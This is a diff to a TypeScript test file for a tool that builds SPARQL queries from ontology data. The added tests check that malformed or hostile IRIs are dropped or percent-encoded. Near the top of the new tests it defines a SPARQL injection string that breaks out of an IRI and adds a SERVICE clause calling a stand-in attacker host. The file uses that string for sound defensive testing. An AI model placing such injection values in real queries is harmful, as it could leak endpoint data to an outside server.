@@ -26,6 +26,9 @@ import {
   leadDisclosures,
   labelKinds,
   hiddenRows,
+  headQuery,
+  labelsWanted,
+  reuseQuery,
   shortFormRepeats,
   xrefName,
   xrefsByDatabase,
@@ -1201,5 +1204,52 @@ describe('the short form beside the header IRI', () => {
   it('stays when it differs from the local part', () => {
     expect(shortFormRepeats('CL:0009001', OBO, 'obo:CL_0009001')).toBe(false);
     expect(shortFormRepeats('obo', OBO, 'obo:CL_0009001')).toBe(false);
+  });
+});
+
+describe('values from the data in SPARQL', () => {
+  const ATTACK =
+    'http://example.org/x> } SERVICE <https://attacker.example/sparql> { ?s ?p ?d } } #';
+  const clean = (q: string) => {
+    // what cannot close the IRI stays inside it, percent-encoded
+    expect(q).not.toMatch(/\sSERVICE\s/);
+    expect(q).not.toContain('attacker.example/sparql>');
+  };
+  it('leaves out of a names query what is no IRI, and keeps the others', () => {
+    const q = namesQuery([ATTACK, 'http://example.org/ok', 'http://x/\u0001y', 'not an iri'], null);
+    clean(q);
+    expect(q).toContain('VALUES ?s { <http://example.org/ok> }');
+    expect(q).not.toContain('\u0001');
+    expect(q).not.toContain('not an iri');
+  });
+  it('writes a graph it is given so that it cannot close the IRI', () => {
+    clean(namesQuery(['http://example.org/ok'], ATTACK));
+    clean(namesQuery(['http://example.org/ok'], null, [ATTACK]));
+    clean(headQuery(ATTACK));
+    clean(definitionsQuery([ATTACK], null));
+    clean(definitionsQuery(['http://example.org/ok'], ATTACK));
+  });
+  it('writes the entity and property of the other queries so too', () => {
+    clean(reuseQuery(ATTACK));
+    clean(incomingQuery(ATTACK, ATTACK, ['default'], 0));
+    clean(incomingQuery('http://x/a', 'http://x/p', [ATTACK], 0));
+    clean(usageQuery(ATTACK, ['default'], 0));
+    // an ordinary IRI is written as it is
+    expect(reuseQuery('http://x/a#b')).toContain('<http://x/a#b>');
+  });
+  it('asks for labels only of valid IRIs that have none', () => {
+    expect(
+      labelsWanted(
+        [ATTACK, 'http://x/known', 'http://x/new', 'urn:a:b', 'PMID:1', 'http://x/new'],
+        { 'http://x/known': { label: 'known' } },
+      ),
+    ).toEqual(['http://x/new', 'urn:a:b']);
+  });
+  it('keeps a cross-reference that is no IRI as its plain value', () => {
+    const asked: string[] = [];
+    expect(
+      xrefName({ database: '', id: ATTACK, value: ATTACK }, (i) => (asked.push(i), 'no'), {}),
+    ).toBe(ATTACK);
+    expect(asked).toEqual([]);
   });
 });
